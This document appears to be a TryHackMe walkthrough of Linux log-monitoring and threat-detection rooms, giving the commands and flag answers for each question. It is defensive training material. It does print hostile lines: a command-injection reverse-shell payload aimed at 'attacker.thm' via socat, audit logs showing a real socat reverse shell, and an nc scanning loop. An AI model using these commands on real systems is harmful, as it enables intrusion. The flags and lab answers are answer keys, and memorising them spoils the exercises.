# THM_Linux-Security-Monitoring

## Table of Contents
1. [Linux Logging for SOC](#linux-logging-for-soc)
2. [Linux Threat Detection 1](#linux-threat-detection-1) 
3. [Linux Threat Detection 2](#linux-threat-detection-2)
4. [Linux Threat Detection 3](#linux-threat-detection-3)

## Linux Logging for SOC
### Working with Text Logs
1. Use the /var/log/syslog file on the VM to answer the questions. Which time server domain did the VM contact to sync its time?

    We can use this command to find the time server domain:
    
    ```bash
    cat /var/log/syslog | grep timesync
    ```
    The answer is `ntp.ubuntu.com`.

2. What is the kernel message from Yama in /var/log/syslog?

    We can use this command to find the kernel message from Yama:
    
    ```bash
    cat /var/log/syslog | grep Yama
    ```
    The answer is `Becoming mindful.`.

### Authentication Logs
1. Continue with the VM and use the /var/log/auth.log file. Which IP address failed to log in on multiple users via SSH?

    We can use this command to find the IP address that failed to log in via SSH:
    
    ```bash
    cat /var/log/auth.log | grep "sshd" | grep -E 'Accepted|Failed'
    ```
    The answer is `10.14.94.82`.

2. Which user was created and added to the "sudo" group?

    We can use this command to find the user that was created and added to the "sudo" group:
    
    ```bash
    cat /var/log/auth.log | grep -E '(passwd|useradd|usermod|userdel)\['
    ```
    The answer is `xerxes`.

### Common Linux Logs
1. According to the VM's package manager logs, which version of unzip was installed on the system?

    We can use this command to find the version of unzip that was installed:
    
    ```bash
    cat /var/log/dpkg.log | grep unzip
    ```
    The answer is `6.0-28ubuntu4.1`.

2. What is the flag you see in one of the users' bash history?

    We can use this command to find the flag in the users' bash history:
    
    ```bash
    history
    ```
    But i got nothing with current `ubuntu` user, so i switch to `root` user and run the command again, then i found the flag is `THM{note_to_remember}`.

### Runtime Monitoring
1. Which Linux system call is commonly used to execute a program?

    The Linux system call commonly used to execute a program is `execve`.

2. Can a typical program open a file or create a process bypassing system calls? (Yea/Nay)

    `Nay`, a typical program cannot bypass system calls to open a file or create a process. System calls are the fundamental interface between user-space applications and the kernel, and they are necessary for performing these operations.

### Using Auditd
1. When was the secret.thm file opened for the first time? (MM/DD/YY HH:MM:SS). Note: Access to this file is logged with the "file_thmsecret" key.

    We can use this command to find when the secret.thm file was opened for the first time:
    
    ```bash
    ausearch -i -k file_thmsecret
    ```
    Then, look for the first entry with the `openat` syscall. The answer is `08/13/25 18:36:54`.

2. What is the original file name downloaded from GitHub via wget? Note: Wget process creation is logged with the "proc_wget" key.

    We can use this command to find the original file name downloaded from GitHub via wget:
    
    ```bash
    ausearch -i -k proc_wget
    ```
    Then, look for the entry with the `execve` syscall. The answer is `naabu_2.3.5_linux_amd64.zip`.

3. Which network range was scanned using the downloaded tool? Note: There is no dedicated key for this event, but it's still in auditd logs.

    To solve this, we can check all `auditd` logs in the `/var/log/audit/audit.log`. We can use this filter:

    ```bash
    cat /var/log/audit/audit.log | grep naabu
    ```
    The answer is `192.168.50.0/24`.


## Linux Threat Detection 1
### Initial Access via SSH
1. When did the ubuntu user log in via SSH for the first time? Answer Example: 2023-09-16.

    We can use this command to find when the ubuntu user logged in via SSH for the first time:
    
    ```bash
    cat /var/log/auth.log | grep "sshd" | grep "Accepted" | grep "ubuntu"
    ```
    The answer is `2024-10-22`.

2. Did the ubuntu user use SSH keys instead of a password for the above found date? (Yea/Nay)

    We can check the same log entries for the presence of "publickey" to determine if SSH keys were used. The answer is `Yea`.

### Detecting SSH Attacks
1. When did the SSH password brute force start? Answer Format: 2023-09-15.

    We can use this command to find when the SSH password brute force started:
    
    ```bash
    cat /var/log/auth.log | grep "sshd" | grep "Failed"
    ```
    The answer is `2025-08-21`.

2. Which four users did the botnet attempt to breach? Answer Format: Separate by a comma, in alphabetical order.

    We can analyze with the same filter like in the previous. The answer is `root, roy, sol, user`.

3. Finally, which IP managed to breach the root user?

    We can use this command to find which IP managed to breach the root user:
    
    ```bash
    cat /var/log/auth.log | grep "sshd" | grep root | grep -E "Failed|Accepted"
    ```
    The answer is `91.224.92.79`.

### Initial Access via Services
1. What is the path to the Python file the attacker attempted to open?

    We can use this command to find the path to the Python file the attacker attempted to open:
    
    ```bash
    grep ".py" /var/log/nginx/access.log
    ```
    The answer is `/opt/trypingme/main.py`.

2. Looking inside the opened file, what's the flag you see there?

    We can use this command to look inside the opened file:
    
    ```bash
    cat /opt/trypingme/main.py
    ```
    The answer is `THM{i_am_vulnerable!}`.

### Detecting Service Breach
1. What is the PPID of the suspicious whoami command?

    We can use this command to find the PPID of the suspicious whoami command:
    
    ```bash
    ausearch -i -x whoami
    ```
    The answer is `1018`.

2. Moving up the tree, what is the PID of the TryPingMe app?

    We can use `ausearch` to examine `whoami` command:
    
    ```bash
    ausearch -i -x whoami
    ```
    Then, look for the `ppid` field in the output. We can use the `ppid` value to move up to the tree to find the PID of the TryPingMe app:
    
    ```bash
    ausearch -i --pid 1018
    ausearch -i --pid 577
    ```
    The answer is `577`.

3. Which program did the attacker use to open a reverse shell?

    We already have the PID of the TryPingMe app that is used to execute command, so we can check the same logs for that have  PPID to find which program was used to open a reverse shell:
    
    ```bash
    ausearch -i --ppid 577 | grep proctitle=
    ```
    The answer is `python`.

### Advanced Initial Access
1. Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?

    The answer is `Supply Chain Compromise`.

2. Which detection method can you use to detect a variety of Initial Access techniques?

    The answer is `process tree analysis`.


## Linux Threat Detection 2
### Discovery Overview
1. Run systemd-detect-virt to detect the system's cloud. What is the command's output you discovered?

    We can use this command to detect the system's cloud:
    
    ```bash
    systemd-detect-virt
    ```
    The answer is `Amazon`.

2. Now run ps aux and look for EDR or antivirus processes. What is the full path to the detected antimalware binary?

    We can use this command to look for EDR or antivirus processes:
    
    ```bash
    ps aux | grep -E "security|scan|edr|malware"
    ```
    The answer is `/var/lib/ultrasec/malscan`.

### Detecting Discovery
1. What is the path of the script that initiated the "hostname" command?

    We can use this command to find the path of the script that initiated the "hostname" command:
    
    ```bash
    ausearch -i -x hostname
    ```
    Then, we can look for the process tree by examining the `ppid` field in the output. 

    ```bash
    ausearch -i --pid 3771
    ```
    The answer is `/home/itsupport/debug.sh`.

2. What was the last Discovery command launched by the script?

    We can continue to examine the process tree to find the last Discovery command launched by the script:
    
    ```bash
    ausearch -i --ppid 3771 | grep proctitle
    ```
    The answer is `ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu`.

3. Looking at the script content, what's the email of the script author?

    We can use this command to look at the script content:
    
    ```bash
    cat /home/itsupport/debug.sh
    ```
    The answer is `greg@tryhackme.thm`.

### Motivation for Attacks
1. From which domain was the Elastic agent downloaded?

    We can use this command to find from which domain the Elastic agent was downloaded:
    
    ```bash
    grep -E "wget|curl" /var/log/audit/audit.log | grep elastic
    ```
    The answer is `artifacts.elastic.co`.

2. What is the full path to the downloaded "helper.sh" script?

    We can use this command to find the full path to the downloaded "helper.sh" script:
    
    ```bash
    grep -E "wget|curl" /var/log/audit/audit.log | grep helper.sh
    ```
    The answer is `/var/tmp/helper.sh`.

3. Which of the downloaded files is more likely to be malicious: The one downloaded with curl or wget?

    This question refers to the two files we found in the previous questions. The elastic agent downloaded with `wget` is a legitimate file, while the `helper.sh` script downloaded with `curl` and also stored in the `/var/temp` which make it more likely to be malicious. Therefore, the answer is `curl`.

### Dota3: First Action
1. Which IP address managed to brute-force the exposed SSH?

    We can use this command to find which IP address managed to brute-force the exposed SSH:
    
    ```bash
    cat auth.log | grep "sshd" | grep -E 'Accepted|Failed'
    ```
    The answer is `45.9.148.125`.

2. Which command did the attacker use to list the last logged-in users?

    We can use this command to find which command the attacker used to list the last logged-in users:
    
    ```bash
    ausearch -i -x last
    ```
    We must make sure that it come from the attackers ip address, so we can filter with the `pid` and `ppid` fields to find the correct entry.

    ```bash
    ausearch -i -if /home/ubuntu/scenario/audit.log --pid 5393
    ```
    Here the output:

    ```bash
    type=USER_LOGIN msg=audit(09/11/25 21:13:33.997:2109) : pid=5393 uid=root auid=root ses=39 subj=unconfined msg='op=login id=root exe=/usr/sbin/sshd hostname=45.9.148.125 addr=45.9.148.125 terminal=/dev/pts/1 res=success'UID="root" AUID="root" ID="root" 
    ```
    We can see it has same IP address as the attacker. The answer is `last`.

3. Which three EDR processes did the attacker look for with "egrep"? Answer Format: Separated by a comma, in alphabetical order.

    We can use this command to find which three EDR processes the attacker looked for with "egrep":
    
    ```bash
    ausearch -i -if /home/ubuntu/scenario/audit.log --ppid 5393| grep egrep
    ```
    The answer is `ds_agent,falcon,sentinel`.

### Dota3: Miner Setup
1. What is the name of the malicious archive that was transferred via SCP?

    We can continue to investigate the log that have ppid 5393 to find the name of the malicious archive that was transferred via SCP:
    
    ```bash
    ausearch -i -if /home/ubuntu/scenario/audit.log --ppid 5393
    ```
    We will findout that the attacker made `/tmp/.apt` directory and then extracted `kernupd.tar.gz` archive to that directory. The answer is `kernupd.tar.gz`.

2. What was the full command line of the cryptominer launch?

    We can continue with same filter. The answer is `nohup /tmp/.apt/kernupd/kernupd`.

3. Which IP address range did the attacker scan for an exposed SSH? Answer Example: 10.0.0.1-10.0.0.126.

    We can still use the same filter to find which IP address range did the attacker scan for an exposed SSH. We will find that the attacker used this command:

    ```bash
    type=PROCTITLE msg=audit(09/11/25 21:15:20.513:2287) : proctitle=nohup bash -c for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
    type=CWD msg=audit(09/11/25 21:15:20.513:2287) : cwd=/tmp 
    type=EXECVE msg=audit(09/11/25 21:15:20.513:2287) : argc=3 a0=bash a1=-c a2=for ip in 10.10.12.{1..10}; do nc -zvw1 $ip 22 2>&1 | grep succeeded; done 
    type=SYSCALL msg=audit(09/11/25 21:15:20.513:2287) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7fff0269de90 a1=0x7fff0269e140 a2=0x7fff0269e160 a3=0x8 items=2 ppid=5393 pid=5518 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=39 comm=bash exe=/usr/bin/bash subj=unconfined key=exec RCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
    ```
    The answer is `10.10.12.1-10.10.12.10`.


## Linux Threat Detection 3
### Reverse Shell
1. Run 127.0.0.1 && whoami in the TryPingMe web app. What output do you see after the ping results?

    The answer is `svctrypingme`.

2. Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run 127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh in the web app. What is the flag returned in the TryPingMe response?

    The answer is `THM{revshells_practitioner!}`.

3. Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?


    Since the previous question is using `socat` to spawn a reverse shell, we can filter the logs with `socat` keyword to find which IP spawned a similar reverse shell via the TryPingMe app:
    
    ```bash
    ausearch -i -if /home/ubuntu/scenario/audit.log -x socat
    ```
    The output looks like this:

    ```bash
    type=PROCTITLE msg=audit(09/23/25 14:52:23.512:2126) : proctitle=socat TCP:10.14.105.255:1337 EXEC:sh,pty,stderr,setsid,sigint,sane 
    type=CWD msg=audit(09/23/25 14:52:23.512:2126) : cwd=/opt/trypingme 
    type=EXECVE msg=audit(09/23/25 14:52:23.512:2126) : argc=3 a0=socat a1=TCP:10.14.105.255:1337 a2=EXEC:sh,pty,stderr,setsid,sigint,sane 
    type=SYSCALL msg=audit(09/23/25 14:52:23.512:2126) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5cf7b618a740 a1=0x5cf7b618a6b8 a2=0x5cf7b618a6d8 a3=0x8 items=2 ppid=2543 pid=2545 auid=unset uid=svctrypingme gid=svctrypingme euid=svctrypingme suid=svctrypingme fsuid=svctrypingme egid=svctrypingme sgid=svctrypingme fsgid=svctrypingme tty=(none) ses=unset comm=socat exe=/usr/bin/socat1 subj=unconfined key=exec
    ```
    The answer is `10.14.105.255`.

### Privilege Escalation
1. Which command line was used to look for the "pass" keyword in files?

    In the previous question, we found that the attacker used `socat` to spawn a reverse shell. We can check the process with that ppid to find which command line was used to look for the "pass" keyword in files:
    
    ```bash
    ausearch -i -if /home/ubuntu/scenario/audit.log --ppid 2545
    ausearch -i -if /home/ubuntu/scenario/audit.log --ppid 2546
    ```
    Then, we will get on of the output like this:

    ```bash
    type=PROCTITLE msg=audit(09/23/25 14:53:10.724:2136) : proctitle=grep -iR pass . 
    type=CWD msg=audit(09/23/25 14:53:10.724:2136) : cwd=/opt/trypingme 
    type=EXECVE msg=audit(09/23/25 14:53:10.724:2136) : argc=4 a0=grep a1=-iR a2=pass a3=. 
    type=SYSCALL msg=audit(09/23/25 14:53:10.724:2136) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x6390c532c678 a1=0x6390c532c5d0 a2=0x6390c532c5f8 a3=0x8 items=2 ppid=2546 pid=2552 auid=unset uid=svctrypingme gid=svctrypingme euid=svctrypingme suid=svctrypingme fsuid=svctrypingme egid=svctrypingme sgid=svctrypingme fsgid=svctrypingme tty=(none) ses=unset comm=grep exe=/usr/bin/grep subj=unconfined key=exec 
    ```
    The answer is `grep -iR pass .`.

2. Which command line was used to escalate privileges to root?

    One of the output from the previous question looks like this:

    ```bash
    type=PROCTITLE msg=audit(09/23/25 14:53:49.262:2138) : proctitle=su root 
    type=CWD msg=audit(09/23/25 14:53:49.262:2138) : cwd=/opt/trypingme 
    type=EXECVE msg=audit(09/23/25 14:53:49.262:2138) : argc=2 a0=su a1=root 
    type=SYSCALL msg=audit(09/23/25 14:53:49.262:2138) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x6390c532c5e8 a1=0x6390c532c550 a2=0x6390c532c568 a3=0x8 items=2 ppid=2546 pid=2554 auid=unset uid=svctrypingme gid=svctrypingme euid=root suid=root fsuid=root egid=svctrypingme sgid=svctrypingme fsgid=svctrypingme tty=(none) ses=unset comm=su exe=/usr/bin/su subj=unconfined key=exec
    ```
    The answer is `su root`.

3. Looking at the detected .env file, what was the root password?

    Still from the previous question, one of the output looks like this:

    ```bash
    type=PROCTITLE msg=audit(09/23/25 14:53:44.238:2137) : proctitle=cat .env.local 
    type=CWD msg=audit(09/23/25 14:53:44.238:2137) : cwd=/opt/trypingme 
    type=EXECVE msg=audit(09/23/25 14:53:44.238:2137) : argc=2 a0=cat a1=.env.local 
    type=SYSCALL msg=audit(09/23/25 14:53:44.238:2137) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x6390c532c5f8 a1=0x6390c532c560 a2=0x6390c532c578 a3=0x8 items=2 ppid=2546 pid=2553 auid=unset uid=svctrypingme gid=svctrypingme euid=svctrypingme suid=svctrypingme fsuid=svctrypingme egid=svctrypingme sgid=svctrypingme fsgid=svctrypingme tty=(none) ses=unset comm=cat exe=/usr/bin/cat subj=unconfined key=exec 
    ```
    We can see the directory is `/opt/trypingme/.env.local`, so we can check the content of that file to find the root password:
    
    ```bash
    cat /opt/trypingme/.env.local
    ``` 
    The answer is `nGql1pQkGa`.

### Startup Persistence
1. What flag did you get after running the malware persisting as a service?

    First, we can search the modification of systemd services in the `auditd` logs:
    
    ```bash
    ausearch -i -f /etc/systemd
    ```
    One of the output looks like this:

    ```bash
    type=PROCTITLE msg=audit(09/23/25 17:07:11.421:836) : proctitle=nano /etc/systemd/system/tux.service 
    type=PATH msg=audit(09/23/25 17:07:11.421:836) : item=1 name=/etc/systemd/system/tux.service inode=616 dev=103:01 mode=file,644 ouid=root ogid=root rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
    type=PATH msg=audit(09/23/25 17:07:11.421:836) : item=0 name=/etc/systemd/system/ inode=410 dev=103:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
    type=CWD msg=audit(09/23/25 17:07:11.421:836) : cwd=/home/ubuntu 
    type=SYSCALL msg=audit(09/23/25 17:07:11.421:836) : arch=x86_64 syscall=openat success=yes exit=3 a0=AT_FDCWD a1=0x6462dcfb9c40 a2=O_WRONLY|O_CREAT|O_TRUNC a3=0x1b6 items=2 ppid=1265 pid=1310 auid=ubuntu uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=8 comm=nano exe=/usr/bin/nano subj=unconfined key=systemd 
    ```
    Then, we can read the content of the created service file:
    
    ```bash
    cat /etc/systemd/system/tux.service
    ```
    We will get this output:

    ```bash
    [Unit]
    Description=Tux Helper Library
    Wants=network-online.target
    After=network-online.target

    [Service]
    ExecStart=/var/lib/misc/tux

    [Install]
    WantedBy=multi-user.target
    ```
    We can see that the service is executing `/var/lib/misc/tux`. We didnt get the flag yet, it asks us this question:

    ```bash
    ubuntu@thm-vm:/opt/trypingme$ /var/lib/misc/tux
    =========================================
    Good job finding me! Where did I persist
    Example: /folder/name.service
    =========================================
    Your answer:
    ```
    We can see that the service file is located in `/etc/systemd/system/tux.service`, so we can answer with that path to get the flag. The answer is `THM{hidden_penguin!}`.

2. What flag did you get after running the malware persisting as a cron job?

    We can search for the modification of cron jobs in the `auditd` logs:
    
    ```bash
    ausearch -i -x crontab
    ```
    One of the output looks like this:

    ```bash
    type=PROCTITLE msg=audit(09/23/25 17:07:38.770:837) : proctitle=crontab -e 
    type=PATH msg=audit(09/23/25 17:07:38.770:837) : item=1 name=crontabs/tmp.P5H675 inode=564223 dev=103:01 mode=file,600 ouid=root ogid=crontab rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
    type=PATH msg=audit(09/23/25 17:07:38.770:837) : item=0 name=crontabs/ inode=517077 dev=103:01 mode=dir,sticky,730 ouid=root ogid=crontab rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
    type=CWD msg=audit(09/23/25 17:07:38.770:837) : cwd=/var/spool/cron 
    type=SYSCALL msg=audit(09/23/25 17:07:38.770:837) : arch=x86_64 syscall=openat success=yes exit=5 a0=AT_FDCWD a1=0x5d5f36f771c0 a2=O_RDWR|O_CREAT|O_EXCL a3=0x180 items=2 ppid=1265 pid=1311 auid=ubuntu uid=root gid=root euid=root suid=root fsuid=root egid=crontab sgid=crontab fsgid=crontab tty=pts1 ses=8 comm=crontab exe=/usr/bin/crontab subj=unconfined key=cron 
    ```
    Then, we can read the content of the created cron job file:
    
    ```bash
    cat /var/spool/cron/crontabs/root
    ```
    We will get this output:

    ```bash
    # For example, you can run a backup of all your user accounts
    # at 5 a.m every week with:
    # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
    # 

    @reboot /usr/sbin/phoenix
    ```
    We can see that the cron job is executing `/usr/sbin/phoenix`. We didnt get the flag yet, it asks us this question:

    ```bash
    root@thm-vm:/var/spool/cron/crontabs$ /usr/sbin/phoenix
    =========================================
    Good job finding me! Where did I persist
    Example: /folder/cronfile
    =========================================
    Your answer: 
    ```
    We can see that the cron job file is located in `/var/spool/cron/crontabs/root`, so we can answer with that path to get the flag. The answer is `THM{ressurect_on_reboot!}`.

### Account Persistence
1. Which user was created and added to the sudo group?

    We can review `auth.log` to find which user was created and added to the sudo group:
    
    ```bash
    cat /var/log/auth.log | grep -E 'useradd|usermod'
    ```
    The answer is `koichi`.

2. Which file was changed to allow SSH key persistence?

    We can use auditd with this filter:

    ```bash
    ausearch -i -f /.ssh/authorized_keys
    ```
    The answer is `/root/.ssh/authorized_keys`.

### Targeted Attacks and Recap
1. Does Linux ransomware exist and impact organizations worldwide? (Yea/Nay)

    The answer is `Yea`, Linux ransomware does exist and has been impacting organizations worldwide, especially those that rely heavily on Linux servers and infrastructure.

2. Should you learn Linux threats even if working with Windows? (Yea/Nay)

    The answer is `Yea`, learning about Linux threats is important even if you primarily work with Windows, as many organizations use a mix of operating systems, and understanding Linux threats can help you better protect your environment and respond to incidents effectively.